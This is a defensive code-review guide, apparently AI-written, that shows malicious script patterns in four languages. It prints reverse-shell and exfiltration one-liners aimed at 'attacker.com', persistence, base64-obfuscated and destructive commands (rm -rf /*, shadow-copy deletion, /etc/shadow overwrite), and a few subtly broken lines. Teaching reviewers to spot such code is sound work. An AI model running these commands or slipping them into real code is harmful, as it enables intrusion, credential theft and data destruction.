# Attack Pattern Examples for Code Review

To help you identify malicious patterns during your code reviews, here are representative examples of harmful scripts across all four languages. These examples demonstrate the "red flag" functions and syntax often used in attacks.

## 1. Persistence & Auto-Start

Attackers want their scripts to run again after a reboot. Look for commands that modify system startup files or schedule tasks.

### Bash
Modifying .bashrc or .profile to run a hidden script.

```bash
echo "@reboot /tmp/.hidden_script &" >> ~/.bashrc
```

### PowerShell
Creating a scheduled task that runs every minute.

```powershell
$t = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -TaskName "Update" -Trigger $t -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c '...'")
```

### Python
Writing to the Windows Registry "Run" key or using crontab on Linux.

```python
import os
os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malicious /t REG_SZ /d "C:\\path\\to\\script.py"')
```

### Node.js
Using the child_process module to append a cron job.

```javascript
require('child_process').exec('echo "* * * * * /usr/bin/node /tmp/malicious.js" | crontab -')
```

## 2. Remote Access (Reverse Shells)

A reverse shell allows an attacker to control your computer remotely. They often use networking utilities like nc (Netcat) or raw sockets.

### Bash
A classic one-liner using /dev/tcp.

```bash
bash -i >& /dev/tcp/://attacker.com 0>&1
```

### PowerShell
Using Net.Sockets.TCPClient to pipe input/output.

```powershell
$c = New-Object System.Net.Sockets.TCPClient("attacker.com",4444)
$s = $c.GetStream()
...
iex $line
```

### Python
Creating a socket and redirecting the shell.

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
subprocess.call(["/bin/bash","-i"])
```

### Node.js
Spawning a shell and piping its output to a network socket.

```javascript
var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", [])
...
net.connect(4444, "attacker.com", function(){
  this.pipe(sh.stdin)
  sh.stdout.pipe(this)
})
```

## 3. Data Exfiltration

These patterns search for sensitive files (SSH keys, AWS tokens, browser databases) and upload them.

### Bash
Finding SSH keys and sending them via curl.

```bash
find ~/.ssh -name "id_*" -exec curl -F "file=@{}" http://attacker.com \;
```

### PowerShell
Collecting all environment variables and sending them to a webhook.

```powershell
$data = Get-ChildItem Env: | Out-String
Invoke-RestMethod -Uri "http://attacker.com" -Method Post -Body $data
```

### Python
Scanning for .env files and exfiltrating their contents.

```python
import glob, requests
[requests.post('http://attacker.com', data=open(f).read()) for f in glob.glob("**/.env", recursive=True)]
```

### Node.js
Reading the Chrome login database and sending it to a remote server.

```javascript
const fs = require('fs')
const data = fs.readFileSync('/path/to/chrome/Default/Login Data')
...
require('http').request('http://attacker.com', {method: 'POST'}).write(data)
```

## 4. Defense Evasion (Obfuscation)

Attackers hide their code to bypass manual inspection or antivirus.

### Bash
Using base64 to hide a payload.

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx" | base64 -d | bash
```

### PowerShell
Using -EncodedCommand (or -enc) to run hidden Base64 logic.

```powershell
powershell.exe -enc JABjID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQuLi4=
```

### Python
Using exec() or eval() on strings that are decrypted or decoded at runtime.

```python
import base64
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzIC1sYScp"))
```

### Node.js
Using eval() or vm.runInContext() on obfuscated JavaScript strings.

```javascript
eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC1sYScp", "base64").toString())
```

## 5. System Impact

Scripts that permanently damage the system or lock the user out.

### Bash
Deleting all files starting from the root directory.

```bash
rm -rf /* 2>/dev/null
```

### PowerShell
Disabling the keyboard and mouse or wiping Volume Shadow Copies.

```powershell
vssadmin delete shadows /all /quiet
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
```

### Python
Renaming or encrypting files (Ransomware behavior).

```python
import os
[os.rename(f, f + ".locked") for f in os.listdir('.') if os.path.isfile(f)]
```

### Node.js
Modifying system configuration files to prevent login.

```javascript
require('fs').writeFileSync('/etc/shadow', 'root:*:12345:0:99999:7:::')
```